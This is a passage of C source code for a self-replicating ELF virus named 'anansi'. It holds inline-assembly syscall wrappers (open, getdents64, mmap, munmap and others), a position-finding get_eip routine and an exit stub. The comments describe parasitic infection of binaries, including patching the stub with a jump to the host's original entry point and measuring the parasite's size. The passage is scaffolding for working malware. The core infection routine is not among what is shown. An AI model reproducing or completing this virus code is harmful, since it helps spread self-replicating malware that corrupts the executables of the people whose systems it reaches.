        type name(arg1_type arg1, arg2_type arg2) { \
                type ret; \
                __asm__ __volatile__(\
                                "movq $4, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2) \
                                        : "%rax", "%rdi", "%rsi" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __munmap_syscall(type, name, arg1, arg1_type, arg2, arg2_type) \
        type name(arg1_type arg1, arg2_type arg2) { \
                type ret; \
                __asm__ __volatile__(\
                                "movq $11, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2) \
                                        : "%rax", "%rdi", "%rsi" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __open_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
        type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) { \
                type ret; \
                __asm__ __volatile__(\
                                "movq $2, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "movq %2, %%rdx\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2), "g" (arg3) \
                                        : "%rax", "%rdi", "%rsi", "%rdx" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __getdents64_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
        type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) { \
                type ret; \
                __asm__ __volatile__(\
                                "movq $78,%%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "movq %2, %%rdx\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2), "g" (arg3) \
                                        : "%rax", "%rdi", "%rsi", "%rdx" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __getcwd_syscall(type, name, arg1, arg1_type, arg2, arg2_type) \
        type name(arg1_type arg1, arg2_type arg2) { \
                type ret; \
                __asm__ __volatile__(\
                                "movq $79, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2) \
                                        : "%rax", "%rdi", "%rsi" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __close_syscall(type, name, arg1, arg1_type) \
        type name(arg1_type arg1) {\
                type ret; \
                __asm__ __volatile__(\
                                "movq $3, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1) \
                                        : "%rax", "%rdi" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

__exit_syscall(int, anansi_exit, status, int);
__write_syscall(long, anansi_write, fd, int, buf, const void *, count, size_t);
__read_syscall(long, anansi_read, fd, int, buf, void *, count, size_t);
__mmap_syscall(void *, anansi_mmap, addr, void *, length, size_t, prot, int, flags, int, fd, int, offset, off_t);
__stat_syscall(long, anansi_stat, path, char *, statbuf, struct stat *);
__munmap_syscall(long, anansi_munmap, addr, void *, len, size_t);
__open_syscall(long, anansi_open, pathname, const char *, flags, int, mode, int);
__getdents64_syscall(long, anansi_getdents64, fd, int, dirp, void *, count, size_t);
__getcwd_syscall(long, anansi_getcwd, buf, char *, size, size_t);
__close_syscall(long, anansi_close, fd, int);

/*
-  Code "end_vx" will serve as the exit routine for when the virus executes via "./anansi" (not as a parasite with it infects a binary).
-  The label (end_vx) will also be used to calculate the parasite size. During parasitic infection this portion of the code is be patch with a "jmp" to the OEP of the binary to restore non-parasitic execution.
*/

/*
-  Dev Note: Write out exit (syscall) routine.
*/

unsigned long get_eip() {
	asm("call foobar\n"
		".globl foobar\n"
		"foobar:\n"
		"pop %rax\n");
}

__attribute__((naked)) void end_code() {
	asm(".globl end_vx\n"
		"end_vx:\n"
		"xorq %rdi, %rdi\n"
		"call anansi_exit\n");
}